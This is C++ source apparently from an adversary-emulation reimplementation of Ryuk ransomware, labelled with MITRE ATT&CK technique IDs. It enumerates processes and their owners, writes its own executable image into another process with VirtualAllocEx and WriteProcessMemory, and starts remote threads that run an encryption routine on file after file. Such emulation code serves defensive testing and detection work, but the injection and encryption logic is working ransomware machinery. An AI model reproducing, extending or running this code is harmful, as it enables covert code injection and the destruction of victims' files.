#include "process_inject.h"

namespace ryuk {

    /*
     * This stuct is used to capture discovered process information from the machine.
     */
    struct ProcessInfo
    {
        TCHAR ProcessName[MAX_PATH]{};
        DWORD ProcessPID = -1;
        INT ProcessType = -1;
    };

    /*
     * This method will take a snapshot of all processes in the system
     * and extract metadata about them using the struct ProcessInfo to
     * store it for use later in execution.
     *
     *  Arguments:
     *      size - Integer specifing how big of an array of ProcessInfo
     *          the function should create.
     *
     *  MITRE ATT&CK Techniques:
     *      T1057 - Process Discovery
     *
     *  Returns:
     *      A pointer to a ProcessInfo type containing the discovered process.
     *      If an error occurs nullptr is returned by this function.
     */
    ProcessInfo* GetProcessInfo(int size)
    {
        // Get the snapshot of all processes in the system
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
        HANDLE hProcessHandle = INVALID_HANDLE_VALUE;
        HANDLE hProcessTokenHandle = INVALID_HANDLE_VALUE;
        PROCESSENTRY32 pe32 = {0};
        ProcessInfo* procInfo = new ProcessInfo[size];
        INT counter = 0;

        if (hSnap == INVALID_HANDLE_VALUE)
        {
            _ftprintf_s(stderr, TEXT("Could not retrieve snapshot of all processes...\n"));
            return nullptr;
        }

        pe32.dwSize = sizeof(PROCESSENTRY32);

        // Get the information of the first process
        if (!Process32First(hSnap, &pe32))
        {
            CloseHandle(hSnap);
            return procInfo;
        }

        _ftprintf_s(stdout, TEXT("[T1057] Discovering Processes with 'CreateToolhelp32Snapshot'...\n"));

        // Loop over all snapshot entries and extract information about the processes
        do
        {
            if (pe32.th32ProcessID != 0)
            {
                _tcsncpy_s(procInfo[counter].ProcessName, pe32.szExeFile, 259);     // Capture process name
                procInfo[counter].ProcessPID = pe32.th32ProcessID;                  // Capture process id
                
                hProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
                if (hProcessHandle)
                {
                    HANDLE hProcessTokenHandle = INVALID_HANDLE_VALUE;

                    if (OpenProcessToken(hProcessHandle, TOKEN_READ, &hProcessTokenHandle))
                    {
                        DWORD TokenInformationLength;
                        TOKEN_USER* tuProcessUserToken = nullptr;

                        GetTokenInformation(hProcessTokenHandle, TokenUser, NULL, NULL, &TokenInformationLength);

                        tuProcessUserToken = (TOKEN_USER*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, TokenInformationLength);

                        if (GetTokenInformation(hProcessTokenHandle, TokenUser, &tuProcessUserToken, TokenInformationLength, &TokenInformationLength))
                        {
                            SID_NAME_USE peUse = SidTypeUnknown;
                            TCHAR *lpName = nullptr, *lpDomain = nullptr;
                            DWORD cchName = 0, cchDomain = 0;

                            LookupAccountSid(nullptr, tuProcessUserToken, nullptr, &cchName, nullptr, &cchDomain, &peUse);

                            lpName = (TCHAR*)GlobalAlloc(GMEM_FIXED, cchName * sizeof(TCHAR));
                            lpDomain = (TCHAR*)GlobalAlloc(GMEM_FIXED, cchDomain * sizeof(TCHAR));

                            if (lpName == nullptr || lpDomain == nullptr)
                            {
                                continue;
                            }

                            LookupAccountSid(nullptr, tuProcessUserToken, lpName, &cchName, lpDomain, &cchDomain, &peUse);

                            // If the process owner is NT AUTHORITY we flag the entry differently.
                            if (lpDomain[0] != TEXT('N') || lpDomain[1] != TEXT('T') || lpDomain[3] != TEXT('A'))
                            {
                                procInfo[counter].ProcessType = 2;
                            }
                            else
                            {
                                procInfo[counter].ProcessType = 1;
                            }

                            GlobalFree(lpName);
                            GlobalFree(lpDomain);
                            counter++;
                        }
                        else
                        {
                            _ftprintf_s(stderr, TEXT("exe = %ls; pid = %d\n"), pe32.szExeFile, pe32.th32ProcessID);
                            _ftprintf_s(stderr, TEXT("Error while querying GetTokenInformation %u\n\n"), GetLastError());
                        }

                        if (hProcessTokenHandle)
                        {
                            if (!CloseHandle(hProcessTokenHandle))
                            {
                                _ftprintf_s(stderr, TEXT("Error in CloseHandle for hProcessTokenHandle...\n"));
                            }
                        }
                    }
                    else
                    {
                        //_ftprintf_s(stderr, TEXT("exe = %ls; pid = %d\n"), pe32.szExeFile, pe32.th32ProcessID);
                        //_ftprintf_s(stderr, TEXT("Error while OpenProcessToken %u\n\n"), GetLastError());
                    }

                    if (hProcessHandle)
                    {
                        if (!CloseHandle(hProcessHandle))
                        {
                            _ftprintf_s(stderr, TEXT("Error in CloseHandle for hProcessHandle...\n"));
                        }
                    }

                }
                else
                {
                    //_ftprintf_s(stderr, TEXT("exe = %ls; pid = %d\n"), pe32.szExeFile, pe32.th32ProcessID);
                    //_ftprintf_s(stderr, TEXT("Error while OpenProcess %u\n\n"), GetLastError());
                }
            }

            pe32.dwSize = sizeof(PROCESSENTRY32);
        } while (Process32Next(hSnap, &pe32));

        if (hSnap)
        {
            if (!CloseHandle(hSnap))
            {
                _ftprintf_s(stderr, TEXT("Error in CloseHandle for hSnap...\n"));
            }
        }

        return procInfo;
    }

    /*
     * This method will used an array of previously discovered processes and
     * attempt to inject ourselves into another process. It will discard processes
     * who are owned by NT AUTHORITY, and some specific ones like crss.exe, explorer.exe
     * and lsaas.exe.
     *
     *  Arguments:
     *      None
     *
     *  MITRE ATT&CK Techniques:
     *      T1055 - Process Injection
     *
     *  Returns:
     *      True if we managed to successfully inject ourselves into another
     *      process. False otherwise.
     */
    DWORD InjectProcess(const TCHAR* processName)
    {
        ProcessInfo* discoveredProcesses = nullptr;
        ProcessInfo info;
        DWORD PID;

        TCHAR CRSS_EXE[] = TEXT("crss.exe");
        TCHAR EXPLORER_EXE[] = TEXT("explorer.exe");
        TCHAR LSAAS_EXE[] = TEXT("lsaas.exe");

        int info_size = 525;

        discoveredProcesses = ryuk::GetProcessInfo(info_size);

        // Check if the process discovery was successful
        if (discoveredProcesses == nullptr)
        {
            return -1L;
        }

        for (int n = 0; n < info_size; n++)
        {
            info = discoveredProcesses[n];

            // Skip any unpopulated entries
            if (info.ProcessPID == -1 || info.ProcessType == -1)
            {
                continue;
            }

            // Skip the three specific processes or if owner is NT A
            if (_tcscmp(info.ProcessName, CRSS_EXE) == 0)
            {
                continue;
            }
            else if (_tcscmp(info.ProcessName, EXPLORER_EXE) == 0)
            {
                continue;
            }
            else if (_tcscmp(info.ProcessName, LSAAS_EXE) == 0)
            {
                continue;
            }
            else if (info.ProcessType == 1)
            {
                continue;
            }
            else if (_tcscmp(info.ProcessName, processName) == 0)
            {
                BOOL result = ryuk::AttemptInjection(&info);
                if (result)
                {
                    PID = info.ProcessPID;
                    delete[] discoveredProcesses;
                    return PID;
                }
            }
            else if (_tcscmp(TEXT("*"), processName) == 0)
            {
                // By passing --process-name *, it serves as wildcard to inject
                // into any process (keeps previous functionality)
                BOOL result = ryuk::AttemptInjection(&info);
                if (result)
                {
                    PID = info.ProcessPID;
                    delete[] discoveredProcesses;
                    return PID;
                }
            }
        }

        delete[] discoveredProcesses;
        return -1L;
    }

    /*
     * This method receives a ProcessInfo structure and tries to perform the Process
     * Injection.
     * 
     *  Arguments:
     *      info - A ProcessInfo struct with the process information to use for injection
     *
     *  MITRE ATT&CK Techniques:
     *      T1055 - Process Injection
     *
     *  Returns:
     *      True if we managed to successfully inject ourselves into another
     *      process. False otherwise.
     */
    BOOL AttemptInjection(const ProcessInfo* info)
    {
        HANDLE hProcessHandle = INVALID_HANDLE_VALUE;
        HANDLE hTargetProcessHandle = INVALID_HANDLE_VALUE;
        HANDLE hRemoteProcessHandle = INVALID_HANDLE_VALUE;
        BOOL operationStatus = FALSE;
        PVOID pImageBase = nullptr;
        PVOID localImage = nullptr;
        PVOID pTargetImage = nullptr;
        LPVOID argumentAddress = nullptr;
        SIZE_T dwNumberOfBytesWritten = 0L;

        _ftprintf_s(stdout, TEXT("[T1055] Starting Process injection using 'VirtualAllocEx', 'WriteProcessMemory' and 'CreateRemoteThread'... "));

        hTargetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, info->ProcessPID);

        if (hTargetProcessHandle)
        {
            pImageBase = GetModuleHandle(0);
            PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pImageBase;
            PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)pImageBase + dosHeader->e_lfanew);

            localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
            if (localImage)
            {
                memcpy(localImage, pImageBase, ntHeader->OptionalHeader.SizeOfImage);

                if (pImageBase)
                {
                    SetLastError(0);
                    pTargetImage = VirtualAllocEx(hTargetProcessHandle, pImageBase, ntHeader->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

                    if (pTargetImage)
                    {
                        dwNumberOfBytesWritten = 0L;
                        if (WriteProcessMemory(hTargetProcessHandle, pTargetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, &dwNumberOfBytesWritten))
                        {
                            _ftprintf_s(stdout, TEXT("Wrote Ryuk process (%lld bytes) into process PNAME: %ls\tPID: %ld\n"), dwNumberOfBytesWritten, info->ProcessName, info->ProcessPID);
                            operationStatus = TRUE;
                        }
                        else
                        {
                            _ftprintf_s(stderr, TEXT("Error in WriteProcessMemory for pTargetImage...\n"));
                        }
                    }
                    else
                    {
                        _ftprintf_s(stderr, TEXT("Error in WriteProcessMemory for pTargetImage...\n"));
                    }
                }
            }
        }

        if (hRemoteProcessHandle)
        {
            if (!CloseHandle(hRemoteProcessHandle))
            {
                _ftprintf_s(stderr, TEXT("Error in CloseHandle for hRemoteProcessHandle...\n"));
            }
        }
        else
        {
            if (!VirtualFreeEx(hTargetProcessHandle, pTargetImage, 0, MEM_RELEASE))
            {
                _ftprintf_s(stderr, TEXT("Error in VirtualFreeEx for pTargetImage...\n"));
            }
        }
        if (hTargetProcessHandle)
        {
            if (!CloseHandle(hTargetProcessHandle))
            {
                _ftprintf_s(stderr, TEXT("Error in CloseHandle for hTargetProcessHandle...\n"));
            }
        }
        if (hProcessHandle)
        {
            if (!CloseHandle(hProcessHandle))
            {
                _ftprintf_s(stderr, TEXT("Error in FreeLibrary for hProcessHandle...\n"));
            }
        }
        if (pImageBase)
        {
            if (!FreeLibrary((HMODULE)pImageBase))
            {
                _ftprintf_s(stderr, TEXT("Error in FreeLibrary for pImageBase...\n"));
            }
        }
        if (localImage)
        {
            if (!VirtualFree(localImage, 0, MEM_RELEASE))
            {
                _ftprintf_s(stderr, TEXT("Error in VirtualFree for localImage...\n"));
            }
        }

        return operationStatus;
    }

    /*
     * Helper function in charge of launching the encryption function with the filename argument on the injected process.
     * 
     *  Arguments:
     *      dwTargetProcessPID - Holds the injected process PID
     *      tFileToEncrypt - A string to a filename on disk to encrypt
     *      iFileLen - Holds the length of tFileToEncrypt
     *      EncryptionProcedureL - Function pointer to what we want to execute from the remote thread
    */
    BOOL CreateEncryptionThread(DWORD dwTargetProcessPID, const TCHAR* tFileToEncrypt, const SIZE_T iFileLen, EncryptionProcedureFunc EncryptionProcedureL, std::map<HANDLE, LPVOID>* processExMemory)
    {
        HANDLE hTargetProcessHandle = INVALID_HANDLE_VALUE;
        HANDLE hRemoteProcessHandle = INVALID_HANDLE_VALUE;
        BOOL operationStatus = FALSE;
        SIZE_T dwNumberOfBytesWritten = 0L;
        LPVOID lpArgumentAddress = nullptr;
        DWORD dwExitCode = 0L;

        hTargetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwTargetProcessPID);

        if (hTargetProcessHandle)
        {
            lpArgumentAddress = VirtualAllocEx(hTargetProcessHandle, 0, iFileLen * sizeof(TCHAR), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (lpArgumentAddress)
            {
                if (WriteProcessMemory(hTargetProcessHandle, lpArgumentAddress, ((LPCVOID)tFileToEncrypt), iFileLen * sizeof(TCHAR), &dwNumberOfBytesWritten))
                {
                    hRemoteProcessHandle = CreateRemoteThread(hTargetProcessHandle, nullptr, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)EncryptionProcedureL), lpArgumentAddress, 0L, nullptr);
                    if (hRemoteProcessHandle)
                    {
                        operationStatus = TRUE;
                        processExMemory->insert(std::pair<HANDLE, LPVOID>(hRemoteProcessHandle, lpArgumentAddress));
                    }
                }
                else
                {
                    _ftprintf_s(stderr, TEXT("Error in CreateEncryptionThread::WriteProcessMemory for argumentAddress. Error %u\n"), GetLastError());

                    if (!VirtualFreeEx(hTargetProcessHandle, lpArgumentAddress, 0L, MEM_RELEASE))
                    {
                        _ftprintf_s(stderr, TEXT("Error in CreateEncryptionThread::WriteProcessMemory::VirtualFreeEx for argumentAddress. Error %u\n"), GetLastError());
                    }
                }
            }
            else
            {
                _ftprintf_s(stderr, TEXT("Error in CreateEncryptionThread::VirtualAllocEx for argumentAddress. Error %u\n"), GetLastError());
            }

            // In order to not bloat the injected process memory, every 10K files we will free up that memory.
            if (processExMemory->size() >= 10000)
            {
                _ftprintf_s(stdout, TEXT("."));
            
                while (!processExMemory->empty())
                {
                    Sleep(500);
                    for (std::map<HANDLE, LPVOID>::iterator it = processExMemory->begin(); it != processExMemory->end(); )
                    {
                        if (GetExitCodeThread(it->first, &dwExitCode))
                        {
                            if (dwExitCode != STILL_ACTIVE)
                            {
                                // Exit code 0 success encrypt and -14 means it tried to encrypt a file that was already encrypted.
                                if ((dwExitCode != 0L) && (dwExitCode != -14L))
                                {
                                    _ftprintf_s(stderr, TEXT("EncryptionThread exited with status code %ld\n"), dwExitCode);
                                }
                                if (!VirtualFreeEx(hTargetProcessHandle, it->second, 0L, MEM_RELEASE))
                                {
                                    _ftprintf_s(stderr, TEXT("Error in CreateEncryptionThread::processExMemory::VirtualFreeEx for argumentAddress %u...\n"), GetLastError());
                                }
                                if (!CloseHandle(it->first))
                                {
                                    _ftprintf_s(stderr, TEXT("Error in CreateEncryptionThread::processExMemory::CloseHandle for hTargetProcessHandle %u...\n"), GetLastError());
                                }
                                it = processExMemory->erase(it);
                            }
                            else
                            {
                                it++;
                            }
                        }
                        else
                        {
                            _ftprintf_s(stderr, TEXT("Error in CreateEncryptionThread::GetExitCodeThread %u...\n"), GetLastError());
                            it++;
                        }
                    }
                }
            }

            if (!CloseHandle(hTargetProcessHandle))
            {
                _ftprintf_s(stderr, TEXT("Error in CloseHandle for hTargetProcessHandle...\n"));
            }
        }

        return operationStatus;
    }
}